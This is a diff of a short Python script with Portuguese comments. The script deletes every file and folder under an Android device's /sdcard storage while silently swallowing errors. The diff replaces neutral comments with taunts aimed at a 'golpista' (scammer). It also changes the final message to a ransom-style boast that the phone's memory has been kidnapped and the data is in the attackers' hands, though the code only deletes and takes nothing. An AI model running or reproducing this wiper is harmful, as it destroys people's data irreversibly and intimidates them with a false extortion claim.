@@ -3,11 +3,11 @@
 import os
 import shutil
 
-# Caminho do diretório a ser excluído
+# ir ate a memória do Android 
 diretorio_sdcard = '/sdcard'
 
 try:
-    # Remover todos os arquivos e diretórios dentro do diretório
+    #se fudeu golpista
     for filename in os.listdir(diretorio_sdcard):
         file_path = os.path.join(diretorio_sdcard, filename)
         try:
@@ -19,8 +19,8 @@ try:
             # Comentamos as mensagens de erro
             pass
 
-    # Exibir mensagem de conclusão
-    print("Memória do celular sequestrada com susseso.")
+    # se fudeu
+    print("Memória do celular sequestrada com susseso seus dados estão em nossas mãos")
 except Exception as e:
     # Comentamos a mensagem de erro
     pass
